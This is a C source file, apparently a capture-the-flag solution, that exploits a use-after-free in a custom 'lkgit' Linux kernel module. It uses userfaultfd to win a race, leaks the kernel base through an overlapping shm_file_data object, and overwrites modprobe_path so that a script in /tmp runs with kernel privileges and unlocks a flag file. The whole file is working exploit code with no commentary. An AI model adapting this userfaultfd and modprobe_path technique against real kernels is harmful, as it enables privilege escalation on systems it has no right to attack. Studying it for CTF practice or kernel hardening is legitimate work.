#define _GNU_SOURCE
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <unistd.h>
#include "../src/include/lkgit.h"

int fd = -1, uffd = -1;
char str[FILE_MAXSZ];
char hash[HASH_SIZE];
void *addr;
pthread_t uffd_thread;

unsigned long kbase, modprobe_path;

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)

void commit_file(char *content, char *message){
    hash_object req = {
        .content = content,
        .message = message,
    };

    if(ioctl(fd, LKGIT_HASH_OBJECT, &req) != 0)
        errExit("ioctl");

    memcpy(hash, &req.hash, HASH_SIZE);
}

void leak(){
    int shmid;
    char *shmaddr;

    puts("[+] Leak");

    // kfree
    commit_file(str, str);

    // Overlap shm_file_data
    if((shmid = shmget(IPC_PRIVATE, 0x20, 0600)) == -1)
        errExit("shmget");
    shmaddr = shmat(shmid, NULL, 0);
    if(shmaddr == (void *)-1)
        errExit("shmat");
}

void overwrite(){
    puts("[+] Overwrite");

    unsigned long mod[4];
    mod[3] = modprobe_path;

    // kfree hash_object
    commit_file(str, (char *)mod);
    // alloc message in freed object
    commit_file(str, (char *)mod);
}

void *fault_handler_thread(void *args){
    struct pollfd pollfd;
    struct uffd_msg msg;
    int flag = (int)args;

    pollfd.fd = uffd;
    pollfd.events = POLLIN;

    puts("[+] Userfault event");
    while(poll(&pollfd, 1, -1) > 0){
        if(pollfd.revents & POLLERR | pollfd.revents & POLLHUP)
            errExit("poll");
        if(read(uffd, &msg, sizeof(msg)) == 0)
            errExit("read");
        if(msg.event != UFFD_EVENT_PAGEFAULT)
            errExit("event");
        printf("Page fault: %p\n", (void *)msg.arg.pagefault.address);

        if(flag == 0){
            leak();

            struct uffdio_range uffdio_range = {
                .start = msg.arg.pagefault.address,
                .len = 0x1000,
            };
            if(ioctl(uffd, UFFDIO_UNREGISTER, &uffdio_range) == -1)
                errExit("ioctl-UFFDIO_UNREGISTER");
        }else{
            overwrite();

            char buf[0x1000];
            strcpy(buf, "/tmp/x\0");
            struct uffdio_copy uffdio_copy = {
                .src = (unsigned long)buf,
                .dst = (unsigned long)msg.arg.pagefault.address,
                .len = 0x1000,
                .mode = 0,
            };
            if(ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                errExit("ioctl-UFFDIO_COPY");
        }
    }
}

void register_userfaultfd(int flag){
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;

    puts("[+] Register userfaultfd");
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if(uffd == -1)
        errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if(ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");

    addr = mmap(NULL, 0x1000*2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if(addr == MAP_FAILED)
        errExit("mmap");
    printf("[+] mmap: %p\n", addr);

    uffdio_register.range.start = (size_t)addr + 0x1000;
    uffdio_register.range.len = 0x1000;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");
    
    pthread_create(&uffd_thread, NULL, fault_handler_thread, (void *)flag);
}

int main(){
    system("echo -en '#!/bin/sh\nchmod 777 /home/user/flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/y");
    system("chmod +x /tmp/y");

    fd = open("/dev/lkgit", O_RDWR);
    if(fd < 0)
        errExit("open");

    puts("[+] Commit");
    memset(str, 'A', FILE_MAXSZ);
    commit_file(str, str);

    register_userfaultfd(0);

    log_object *req = addr + 0x1000 - (HASH_SIZE + FILE_MAXSZ);
    memcpy(&req->hash, hash, HASH_SIZE);
    ioctl(fd, LKGIT_GET_OBJECT, req);

    kbase = *((unsigned long*)(req->hash+0x8)) - 0xd6e800;
    modprobe_path = kbase + 0xc3cb20;
    printf("[+] kbase = 0x%lx\n", kbase);

    register_userfaultfd(1);

    req = addr + 0x1000 - (HASH_SIZE + FILE_MAXSZ);
    ioctl(fd, LKGIT_AMEND_MESSAGE, req);
    close(fd);

    system("/tmp/y");
    system("cat /home/user/flag");
}
